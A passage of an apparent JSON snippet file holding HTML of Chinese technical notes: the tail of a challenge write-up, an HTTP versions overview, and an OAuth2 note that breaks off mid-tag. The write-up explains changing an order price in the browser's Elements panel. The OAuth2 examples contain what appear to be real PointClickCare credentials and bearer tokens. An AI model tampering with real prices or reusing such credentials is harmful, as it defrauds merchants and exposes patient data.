href=\"#q2-8\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>在 Elements Panel 中搜尋 <code>input</code>，找到對應 <code>Total</code> 的欄位，將價格改成你想要的價格後送出即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/RbpMbvM.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"challenges未解\">Challenges（未解）<a href=\"#challenges未解\" class=\"hash-link\" aria-label=\"Challenges（未解）的直接連結\" title=\"Challenges（未解）的直接連結\">​</a></h2></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [Note] HTTP pjchender.dev": {
    "prefix": "hinternet [Note] HTTP pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[Note] HTTP</h1></header><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http11\">HTTP/1.1<a href=\"#http11\" class=\"hash-link\" aria-label=\"HTTP/1.1的直接連結\" title=\"HTTP/1.1的直接連結\">​</a></h2><ul><li>效能較差：每一次向伺服器發送請求時，都需要開啟新的 TCP 連線</li><li>容量較大：Headers 都是以純文字傳送，沒有進行壓縮</li><li>原始僅支援 Request 和 Response 的機制，Server 無法主動對 client 推送訊息</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http2\">HTTP/2<a href=\"#http2\" class=\"hash-link\" aria-label=\"HTTP/2的直接連結\" title=\"HTTP/2的直接連結\">​</a></h2><p>HTTP/2 是來自 Google 一開始推出的名為 <code>SPDY</code> 的專案。</p><p>然而，當今的 Web 光是載入一頁就會發送多個 request 來獲取 assets，過去 HTTP/1.1 的傳輸方式到了當今的 Web 已經無法處理得又快又好。</p><ul><li><strong>效能提升</strong>：HTTP/2 支援 <strong>multiplexing</strong>，也就是 client 和 server 可以在相同的 TCP 連線中以平行處理（parallel）的方式推送訊息，不需要重覆進行 TCP 交握。</li><li><strong>效能提升</strong>：HTTP/2 支援 server push，也就是 client 送出一次 request 後，server 即可透過 stream 的方式向 client 傳輸多個訊息。</li><li><strong>減少頻寬消耗</strong>：可以壓縮 Header 的內容，以減少頻寬流量消耗。</li><li><strong>減少頻寬消耗</strong>：使用 binary 的方式傳輸資料。</li><li>安全性提升：HTTP/2 只是建議使用 SSL，但瀏覽器會要求開發者使用 SSL / HTTPS。</li><li>支援帶有不同優先順序的請求（request prioritization），可以讓某些請求是比較重要的（例如、CSS 樣式），某些請求這是權重比較低的（例如，圖片）。</li></ul><div class=\"theme-admonition theme-admonition-tip alert alert--success admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 12 16\"><path fill-rule=\"evenodd\" d=\"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z\"></path></svg></span>提示</div><div class=\"admonitionContent_S0QG\"><p>HTTP/2 支援 streaming 的傳輸方式，但並不表示 HTTP/2 一定要用 streaming。</p></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http3\">HTTP/3<a href=\"#http3\" class=\"hash-link\" aria-label=\"HTTP/3的直接連結\" title=\"HTTP/3的直接連結\">​</a></h2><p>HTTP/3 目前也是 Google 的專案，又稱作 <code>QUIC</code>，QUIC 主要是基於 UDP 的協定，處理封包有可能遺失的情況。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考資料\">參考資料<a href=\"#參考資料\" class=\"hash-link\" aria-label=\"參考資料的直接連結\" title=\"參考資料的直接連結\">​</a></h2><ul><li><a href=\"https://imagekit.io/demo/http2-vs-http1\" target=\"_blank\" rel=\"noopener noreferrer\">Performance difference between HTTP2 and HTTP1.1</a> @ imagekit.io</li><li><a href=\"https://www.udemy.com/course/grpc-golang/learn/lecture/11018714#overview\" target=\"_blank\" rel=\"noopener noreferrer\">gRPC [Golang] Master Class: Build Modern API &amp; Microservices</a> @ Udemy</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [Note] OAuth2.0 筆記 pjchender.dev": {
    "prefix": "hinternet [Note] OAuth2.0 筆記 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[Note] OAuth2.0 筆記</h1></header><blockquote><p><a href=\"https://developers.google.com/identity/protocols/oauth2\" target=\"_blank\" rel=\"noopener noreferrer\">OAuth2</a> @ Google Developers</p></blockquote><div class=\"theme-admonition theme-admonition-caution alert alert--warning admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 16 16\"><path fill-rule=\"evenodd\" d=\"M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z\"></path></svg></span>警告</div><div class=\"admonitionContent_S0QG\"><p>本文章中之說明與圖片主要參考自<a href=\"https://speakerdeck.com/chitsaou/jian-dan-yi-dong-de-oauth-2-dot-0\" target=\"_blank\" rel=\"noopener noreferrer\">簡單易懂的 OAuth 2.0</a> by Yu-Cheng Chuang。</p></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"速記\">速記<a href=\"#速記\" class=\"hash-link\" aria-label=\"速記的直接連結\" title=\"速記的直接連結\">​</a></h2><ul><li>Authorization Server 根據使用者的 Client-ID 找到該使用者詢問是否允許 App 存取。</li><li>使用者授權 App 後取得的代碼稱作 <code>Grant Code</code> 或 <code>Authorization Code</code>。</li><li>App 使用 <code>Grant Code</code> 向 Authorization Server 交換取得 <code>Token</code>，這個 Token 通常包含 <code>access token</code> 和 <code>refresh token</code>。</li><li>透過 <code>access token</code> App 可以存取使用者允許的資料。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"oauth2-中的角色\">OAuth2 中的角色<a href=\"#oauth2-中的角色\" class=\"hash-link\" aria-label=\"OAuth2 中的角色的直接連結\" title=\"OAuth2 中的角色的直接連結\">​</a></h3><p>OAuth 指的是 <strong>Open Authorization</strong>，它是一個網頁或 App 可以存取另一個 App 使用者私人資料的方式，在 OAuth2.0 裡面的角色包含：</p><ul><li><strong>Resource Owner（User）</strong>：資料擁有者，通常就是指「使用者」</li><li><strong>Client（App）</strong>：即 <code>App</code>，要存取 <code>User</code> 資料的程式<ul><li>Redirect URI：當 <code>User</code> 本人親自確認後要返回結果到 <code>Client</code></li></ul></li><li><strong>Authorization Server</strong>：總管一切<strong>授權</strong>事務<ul><li><strong>Authorization Endpoint</strong>：用來給 <code>User</code> 本人確認授權，通常是一個網頁，拿到的是 <code>Grant Code/Authorization Code</code>（授權狀）而不是 <code>Token</code>，當 User 答覆之後，會轉回 <code>Client</code> 的 Redirect URI。</li><li><strong>Token Endpoint</strong>：用來給 <code>Client</code> 取得真正的 Token ，通常是 JSON API ，無網頁。</li><li><strong>Redirection Endpoint</strong>：<code>Client</code> 用來接收資料用，用來從瀏覽器接受 Authorization Server 回傳的資料</li></ul></li><li><strong>Resource Server（API）</strong>：即 API，<code>Client</code> 出示 Token 後即可進去取得資料，通常指的是 Google、Facebook、Apple 這類提供第三方登入的服務。</li></ul><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"oauth2-中的各種-token\">OAuth2 中的各種 token<a href=\"#oauth2-中的各種-token\" class=\"hash-link\" aria-label=\"OAuth2 中的各種 token的直接連結\" title=\"OAuth2 中的各種 token的直接連結\">​</a></h3><ul><li><code>Basic OAuth Token</code>：根據 client ID 和 client secret，透過 Base64 Encode 後產生。</li><li><code>Access Token</code>：用來打 Resource Server 的 API 要資料用的，可以設定存取權限範圍（Scope）和期限，並且可以撤銷。</li><li><code>Refresh Token</code>：當 Access Token 過期時用來換發新的 Access Token 用的，Refresh Token 用過一次即失效。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"oauth2-的方式two-legged-vs-three-legged\">OAuth2 的方式：Two-legged vs. Three-legged<a href=\"#oauth2-的方式two-legged-vs-three-legged\" class=\"hash-link\" aria-label=\"OAuth2 的方式：Two-legged vs. Three-legged的直接連結\" title=\"OAuth2 的方式：Two-legged vs. Three-legged的直接連結\">​</a></h2><p>OAuth 可以分成 two-legged 或 three-legged 兩種。Two-legged OAuth 是用在 server-to-server 之間的資料交換，並不能代表某個使用者；Three-legged OAuth 則是大家常用的第三方登入，</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"two-legged-oauth\">Two-legged OAuth<a href=\"#two-legged-oauth\" class=\"hash-link\" aria-label=\"Two-legged OAuth的直接連結\" title=\"Two-legged OAuth的直接連結\">​</a></h3><p>Two-legged OAuth 最主要是用在 server-to-server 之間的資料交換。</p><p>一般來說會分成兩個步驟：</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"step-1使用-basic-authorization-的方式取得-access-token\">STEP 1：使用 Basic Authorization 的方式取得 Access Token<a href=\"#step-1使用-basic-authorization-的方式取得-access-token\" class=\"hash-link\" aria-label=\"STEP 1：使用 Basic Authorization 的方式取得 Access Token的直接連結\" title=\"STEP 1：使用 Basic Authorization 的方式取得 Access Token的直接連結\">​</a></h4><ul><li>將 Resource Server 提供的 Client ID (Customer Key) 和 Customer Secret 組成字串 <code>client_id:client_secret</code> 後透過 Base64 組成編碼後的字串（encoded string）</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/3sTz6Vv.png\" alt=\"PointCLickCare\" class=\"img_ev3q\"></p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/fuVOJaY.png\" alt=\"imgur\" class=\"img_ev3q\"></p><div class=\"language-go codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-go codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// Go</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">func</span><span class=\"token plain\"> </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">GenerateAuthBasicToken</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token builtin\" style=\"color:rgb(130, 170, 255)\">string</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> key </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> os</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Getenv</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;PCC_CUSTOMER_KEY&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> secret </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> os</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Getenv</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;PCC_CUSTOMER_SECRET&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> token </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> fmt</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">Sprintf</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;%v:%v&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> key</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> secret</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> encoded </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:=</span><span class=\"token plain\"> base64</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token plain\">StdEncoding</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">EncodeToString</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">[</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">]</span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">byte</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">token</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">return</span><span class=\"token plain\"> encoded</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// node</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword module\" style=\"font-style:italic\">export</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> generateAuthBasicToken </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token parameter\">string</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> key </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> process</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">env</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token constant\" style=\"color:rgb(130, 170, 255)\">PCC_CUSTOMER_KEY</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> secret </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> process</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">env</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token constant\" style=\"color:rgb(130, 170, 255)\">PCC_CUSTOMER_SECRET</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> token </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation\">key</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string string\" style=\"color:rgb(195, 232, 141)\">:</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">${</span><span class=\"token template-string interpolation\">secret</span><span class=\"token template-string interpolation interpolation-punctuation punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token template-string template-punctuation string\" style=\"color:rgb(195, 232, 141)\">`</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword\" style=\"font-style:italic\">const</span><span class=\"token plain\"> encoded </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token maybe-class-name\">Buffer</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token keyword module\" style=\"font-style:italic\">from</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token plain\">token</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;utf8&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">toString</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;base64&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token keyword control-flow\" style=\"font-style:italic\">return</span><span class=\"token plain\"> encoded</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>把 encoded string 帶入 Header 中：</p><div class=\"language-http codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-http codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">POST /auth/token HTTP/1.1</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Host: connect.pointclickcare.com</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Content-Type: application/x-www-form-urlencoded</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">authorization: Basic UmU5TFhuQmRQczRvMGo1aDFYaE53cDJPRWswbEdzeUs6eGJXRkF4VjIybnE5QnREdA==</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">grant_type=client_credentials</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>接著就會收到伺服器回傳的 <code>access_token</code>：</p><div class=\"language-json codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-json codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;access_token&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;3DSBNdh711xNVJWmdLR4dMLLSw4I:2&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token property\">&quot;expires_in&quot;</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;7199&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"step-2透過-access-token-來和-resource-server-交換資料\">STEP 2：透過 Access Token 來和 resource server 交換資料<a href=\"#step-2透過-access-token-來和-resource-server-交換資料\" class=\"hash-link\" aria-label=\"STEP 2：透過 Access Token 來和 resource server 交換資料的直接連結\" title=\"STEP 2：透過 Access Token 來和 resource server 交換資料的直接連結\">​</a></h4><p>在 Request Header 中使用 <code>Authorization: Bearer &lt;accessToken&gt;</code> 來存取 resouce server 的資料</p><div class=\"language-http codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-http codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">GET /api/public/preview1/orgs/66DA82A2-280A-4B3E-A8E7-0EE9CF25B96D/patients?facId=22 HTTP/1.1</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Host: connect2.pointclickcare.com</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Authorization: Bearer z7dl7559OgkBrVPrhk83ZqUkl1tJ:2</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"three-legged-oauth\">Three-legged OAuth<a href=\"#three-legged-oauth\" class=\"hash-link\" aria-label=\"Three-legged OAuth的直接連結\" title=\"Three-legged OAuth的直接連結\">​</a></h3><p>這是平常比較熟悉的第三方登入的方式。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"流程\">流程<a href=\"#流程\" class=\"hash-link\" aria-label=\"流程的直接連結\" title=\"流程的直接連結\">​</a></h3><p><img loading=\"lazy\" src=\"../../../i.imgur.com/DalXFKK.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><blockquote><p><code>State</code>：用來防止 CSRF 攻擊</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"a-user-發出授權申請\">A. User 發出授權申請<a href=\"#a-user-發出授權申請\" class=\"hash-link\" aria-label=\"A. User 發出授權申請的直接連結\" title=\"A. User 發出授權申請的直接連結\">​</a></h4><ul><li>User 點選<strong>發出授權申請</strong>後（例如，Login with Facebook），Client 會向 Authorization Server（例如，Facebook）發送請求：</li></ul><p><img loading=\"lazy\" src=\"../../../i.imgur.com/zZcEGnR.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"b-問-resource-owner\">B. 問 Resource Owner<a href=\"#b-問-resource-owner\" 